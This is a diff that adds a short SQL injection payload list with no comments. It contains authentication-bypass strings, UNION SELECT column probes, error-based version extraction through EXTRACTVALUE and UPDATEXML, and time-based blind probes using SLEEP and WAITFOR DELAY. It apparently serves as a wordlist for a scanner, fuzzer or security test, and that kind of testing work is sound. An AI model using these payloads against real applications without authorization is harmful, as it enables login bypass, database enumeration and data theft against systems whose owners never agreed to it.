@@ -1,0 +1,14 @@
+admin' or '1'='1
+admin' or '1'='1' --
+admin' or '1'='1' #
+1' or '1'='1
+1' or 1=1 --
+1" or "1"="1
+-1' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+' AND SLEEP(3)--
+' OR SLEEP(3)--
+1; WAITFOR DELAY '0:0:3'--
